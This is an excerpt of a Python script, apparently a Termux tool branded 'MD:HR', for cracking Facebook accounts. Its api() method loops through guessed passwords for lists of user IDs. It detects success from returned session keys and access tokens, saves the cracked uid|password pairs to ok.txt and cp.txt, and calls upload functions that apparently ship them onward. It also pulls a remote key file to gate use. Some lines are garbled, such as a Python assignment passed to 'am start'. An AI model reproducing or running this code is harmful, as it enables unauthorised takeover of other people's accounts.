...
def helpnote():
	...
	subprocess.check_output(["am", "start", "plr = requests.get('https://github.com/9Team10-HR.txt').text"])
	exit(" [*] FACEBOOK :  MD:HR ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰MD:HR")
	subprocess.check_output(["am", "start", "https://m.me/100078472245266"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/9Team10-HR.txt').text
			if basesplit in plr:
				key = basesplit
...
..:::::..::........::::..:::..:::::..::..:::::..:: 
\033[1;90m════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : MD:HR
\033[1;91m [\033[1;94m✓\033[1;91m]
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : 9Team10-HR
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : ***********
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Rahad): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [🍁HR🍁_OLD] : %s/%s -> \033[0;92m [ 😘HR😅-OK:%s ]- \033[0;91m[🥀HR😩-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[🍁HR😅-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [🍁HR😜-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[🍁HR😜-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [🍁HR🍁-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
